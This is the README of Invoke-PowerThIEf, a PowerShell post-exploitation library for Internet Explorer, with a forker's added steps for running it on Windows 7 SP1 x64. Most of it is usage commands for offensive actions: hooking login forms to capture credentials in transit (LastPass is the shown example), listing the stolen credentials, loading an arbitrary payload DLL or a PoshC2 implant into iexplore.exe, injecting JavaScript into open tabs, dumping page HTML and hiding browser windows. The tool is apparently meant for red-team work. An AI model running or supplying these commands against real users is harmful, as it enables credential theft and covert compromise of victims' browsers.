# My change

Add support for Win7sp1 x64.

Invoke-PowerThIEf need Powershell 4.0, but Win7sp1's default Powershell version is 2.0.

So we need to install Microsoft .NET Framework 4.5 and Windows Management Framework 4.0.

### 1.Install .NET Framework 4.5 from the command line

We can use this:

https://github.com/3gstudent/Homework-of-C-Language/blob/master/Install_.Net_Framework_from_the_command_line.cpp

System restart required.

### 2.Install Windows Management Framework 4.0 from the command line

We can get the installation package from：

https://www.microsoft.com/en-us/download/details.aspx?id=40855

Install it from the command line：

```
wusa.exe Windows6.1-KB2819745-x64-MultiPkg.msu /quiet /norestart
```

System restart required.

### 3.Add dependent files

I get [them](https://github.com/3gstudent/Invoke-PowerThIEf/tree/master/Microsoft.mshtml) from my Server2012r2 x64.

Add it from the command line：

```
xcopy Microsoft.mshtml C:\Windows\assembly\GAC\Microsoft.mshtml /i /s /e
```

Then you can use Invoke-PowerThIEf under Win7sp1 x64.

:)


---


# Invoke-PowerThIEf 2018 Nettitude
An IE Post Exploitation Library released at Steelcon in Sheffield 7th July 2018. 

Written by Rob Maslen @rbmaslen

# Examples
### Capturing credentials entered via LastPass
<p align="center">
  <img src="https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Images/creds-lastpass.gif?raw=true" width="800" title="LastPass Credentials in transit">
</p>

### Migrating a PoshC2 implant into IExplore.exe 
<p align="center">
  <img src="https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Images/loading-dll.gif?raw=true" width="800" title="PoshC2 in IExplore">
</p>

### Extracting a "secret" from a page
<p align="center">
  <img src="https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Images/dumphtml.gif?raw=true" width="800" title="PoshC2 in IExplore">
</p>

# Usage
First import the module using . .\Invoke-PowerThIEf.ps1 then use any of the following commands.

## List all currently open browser windows/tabs
### List URLs for all current IE browser sessions, result will contain the BrowserIndex used by other actions
```
Invoke-PowerThIEf -action ListUrls
```

## Capturing credentials in transit
### Automatically scan any windows or tabs for login forms and then record what gets posted. A notification will appear when some have arrived.
```
Invoke-PowerThIEf -action HookLoginForms 
```

### List any creds that have been captured. 
```
Invoke-PowerThIEf -action Creds 
```

## Have IExplore.exe load a DLL of your choosing (must be x64)
### Launch the DLL(x64) specified by the PathPayload param in IE's process
```
Invoke-PowerThIEf -action ExecPayload -PathPayload <path to the payload DLL(x64)>
```

## Invoking JavaScript
### Invoke JavaScript in all currently opened IE windows and tabs
```
Invoke-PowerThIEf -action InvokeJS -Script <JavaScript to run>

Invoke-PowerThIEf -action InvokeJS -Script 'alert(document.location.href);'
```

### Invoke JavaScript in the selected IE window or tab. 
```
Invoke-PowerThIEf -action InvokeJS -BrowserIndex <BrowserIndex> -Script\<JavaScript to run>
```

## Dumping HTML
### Dump HTML from all currently opened IE windows/tabs
```
Invoke-PowerThIEf -action DumpHtml
```

### Dump HTML from the selected IE window or tab. 
```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex>
```

### Dump HTML from all tags of \<type> in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector <type>

Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector div
```

### Dump HTML from any tag with the \<id> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector <id>

Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector idfirstdiv
```

### Dump HTML from any tag with the \<name> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector <name>

Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector namefirstdiv
```

## Showing/Hiding Windows
### Set to visible all IE windows/tabs
```
Invoke-PowerThIEf -action ShowWindow
```

### Set the selected window/tab to be visible. 
```
Invoke-PowerThIEf -action ShowWindow -BrowserIndex <BrowserIndex>
```

### Hide all currently opened IE windows/tabs
```
Invoke-PowerThIEf -action HideWindow
```

### Hide the selected window/tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action HideWindow -BrowserIndex <BrowserIndex>
```

## Navigating the browser
### Navigate all currently opened IE windows/tabs to the \<URL>
```
Invoke-PowerThIEf -action Navigate -NavigateUrl <URL> 
```

### Navigate all currently opened IE windows/tabs to the \<URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 
```

### Navigate all currently opened IE windows/tabs to the \<URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
```
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 
```

## Background tabs
### Open a new background tab in the window that the \<BrowserIndex> is in.
```
Invoke-PowerThIEf -action NewBackgroundTab -BrowserIndex <BrowserIndex>
```

# License
FreeBSD 3
